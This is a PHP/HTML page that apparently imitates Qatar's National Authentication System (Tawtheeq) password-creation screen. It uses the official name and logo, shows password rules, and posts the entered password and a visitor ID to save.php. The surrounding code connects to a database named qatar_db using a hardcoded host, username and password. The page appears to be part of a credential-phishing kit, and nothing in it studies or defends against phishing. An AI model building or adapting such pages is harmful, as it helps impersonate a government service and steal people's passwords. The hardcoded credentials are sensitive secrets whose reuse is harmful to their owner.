<?php
error_reporting(0);
ini_set('display_errors', 0);
$host = "dpg-d95vic9oagis739h761g-a";
$user = "qatar_db_user";
$password = "TpPqGoliCoObGDiGdpEc16ak3PJZ9BB1";
$dbname = "qatar_db";
$port = "5432";

try {
    $dsn = "pgsql:host=$host;port=$port;dbname=$dbname;";
    $pdo = new PDO($dsn, $user, $password, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
    $visitor_id = isset($_POST['visitor_id']) ? $_POST['visitor_id'] : 'visitor_session'; 
} catch (Exception $e) {}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام التوثيق الوطني - إنشاء كلمة المرور</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <style>
        :root { --primary-color: #007fb1; --bg-color: #f5f5f5; --secondary-color: #8a1538; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: var(--bg-color); margin: 0; padding: 0; color: #333; overflow-x: hidden; }
        
        .header { background-color: #fff; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #ddd; height: 70px; }
        .header-right-group { display: flex; align-items: center; gap: 15px; }
        .menu-icon { display: flex; flex-direction: column; justify-content: space-between; width: 22px; height: 16px; cursor: pointer; }
        .menu-icon span { display: block; height: 2px; width: 100%; background-color: var(--primary-color); border-radius: 2px; }
        .logo-tawtheeq { height: 50px; }
        .header-text-left { text-align: left; }

        .container { max-width: 500px; margin: 20px auto; padding: 10px; }
        .form-card { background: #fff; border: 1px solid #e0e0e0; border-radius: 4px; padding: 25px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
        .rules-box { background-color: #e3f2fd; border: 1px solid #bbdefb; border-radius: 4px; padding: 15px; margin-bottom: 25px; }
        .rules-list { margin: 0; padding: 0; list-style: none; font-size: 13px; color: #555; }
        .rules-list li { margin-bottom: 5px; display: flex; align-items: center; transition: 0.3s; }
        .rules-list li::before { content: "●"; margin-left: 8px; color: #ccc; }
        .rules-list li.valid { color: green; }
        .rules-list li.valid::before { color: green; }
        
        .form-group { margin-bottom: 20px; }
        input[type="password"] { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; outline: none; background-color: #f2f2f2; }
        .error-msg { color: red; font-size: 12px; margin-top: 5px; display: none; }
        .btn-submit { width: 100%; background-color: var(--primary-color); color: white; border: none; padding: 12px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; }
        
        .footer-text { text-align: center; margin-top: 30px; font-size: 13px; color: #666; padding-bottom: 20px; }
        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--primary-color); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="loading-overlay">
        <div class="spinner"></div>
        <p style="margin-top: 15px; font-weight: bold; color: var(--primary-color);">جاري حفظ البيانات...</p>
    </div>

    <div class="header">
        <div class="header-right-group">
            <div class="menu-icon"><span></span><span></span><span></span></div>
            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/DhrsVnFpSCHlBdiR.png" class="logo-tawtheeq" alt="Tawtheeq Logo">
        </div>
        <div class="header-text-left">
            <div style="color: var(--secondary-color); font-weight: bold; font-size: 16px;">نظام التوثيق الوطني</div>
            <div style="font-size: 11px; color: #666;">National Authentication System</div>
        </div>
    </div>

    <div class="container">
        <div class="form-card">
            <h2>إنشاء كلمة المرور</h2>
            <div class="rules-box">
                <ul class="rules-list">
                    <li id="r-len">8 أحرف على الأقل</li>
                    <li id="r-up">حرف كبير (A-Z)</li>
                    <li id="r-low">حرف صغير (a-z)</li>
                    <li id="r-num">رقم واحد (0-9)</li>
                </ul>
            </div>

            <form action="save.php" method="POST" id="passwordForm">
                <input type="hidden" name="visitor_id" value="<?php echo htmlspecialchars($visitor_id); ?>">
                <div class="form-group">
                    <input type="password" name="password" id="pass" placeholder="أدخل كلمة المرور" required>
                    <div id="err-pass" class="error-msg">كلمة المرور غير صالحة</div>
                </div>
                <div class="form-group">
                    <input type="password" id="pass_confirm" placeholder="أعد إدخال كلمة المرور" required>
                    <div id="err-match" class="error-msg">كلمات المرور غير متطابقة</div>
                </div>
                <button type="submit" class="btn-submit">استمرار</button>
            </form>
        </div>
        <div class="footer-text">نظام التوثيق الوطني - جميع الحقوق © 2026 محفوظة</div>
    </div>

    <script>
        const pass = document.getElementById('pass');
        const passConfirm = document.getElementById('pass_confirm');
        const errPass = document.getElementById('err-pass');
        const errMatch = document.getElementById('err-match');

        pass.oninput = () => {
            const val = pass.value;
            document.getElementById('r-len').classList.toggle('valid', val.length >= 8);
            document.getElementById('r-up').classList.toggle('valid', /[A-Z]/.test(val));
            document.getElementById('r-low').classList.toggle('valid', /[a-z]/.test(val));
            document.getElementById('r-num').classList.toggle('valid', /[0-9]/.test(val));
        };

        document.getElementById('passwordForm').onsubmit = function(e) {
            const p1 = pass.value;
            const p2 = passConfirm.value;
            let valid = true;

            if(p1.length < 8 || !/[A-Z]/.test(p1) || !/[a-z]/.test(p1) || !/[0-9]/.test(p1)) {
                errPass.style.display = 'block';
                pass.style.borderColor = 'red';
                valid = false;
            } else {
                errPass.style.display = 'none';
                pass.style.borderColor = '#ccc';
            }

            if(p1 !== p2) {
                errMatch.style.display = 'block';
                passConfirm.style.borderColor = 'red';
                valid = false;
            } else {
                errMatch.style.display = 'none';
                passConfirm.style.borderColor = '#ccc';
            }

            if(!valid) {
                e.preventDefault();
            } else {
                document.getElementById('loading-overlay').style.display = 'flex';
            }
        };
    </script>
</body>
</html>
